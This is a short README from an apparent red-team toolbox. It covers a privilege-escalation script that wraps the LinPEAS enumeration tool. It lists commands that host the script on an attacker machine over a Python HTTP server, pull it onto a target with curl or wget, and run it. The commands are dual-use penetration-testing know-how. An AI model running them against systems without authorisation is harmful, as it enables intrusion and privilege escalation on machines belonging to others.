# Privilege Escalation Phase

This phase is about expanding your own authorizations. Access to a system is often only possible with low authorizations. However, tasks from other phases of the attack lifecycle often require increased authorizations. In order for the authorizations to be increased, vulnerabilities in the system, misconfigurations or other security holes must be found.

This script implements *LinPEAS* from [PEASS-ng](https://github.com/carlospolop/PEASS-ng).

For more information, go to [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

## Usage

From github:
```sh
curl -LJO https://github.com/McSquizzy/red-team-toolbox/blob/main/privesc/privesc.sh
sh privesc.sh -h
```
Local network:
```sh
# Host:
python3 -m http.server 8000 #python3
python2 -m SimpleHTTPServer 8000 #python2

# Target:
curl -LJO <Host>:8000/privesc.sh #or
curl <Host>:8000/privesc.sh > privesc.sh #or
wget <Host>:8000/privesc.sh
sh privesc.sh -h
```

## Results

The results are printed directly to STDOUT.
To print the output to a file, use the following command:
```sh
sh privesc.sh -a > /output/file.txt
```
You can read the file with colors:
```sh
less -r /output/file.txt
```

## Compatibility

The script uses /bin/sh syntax and is fully POSIX compatible so can run on most unix-based (POSIX/Unix/Linux) systems.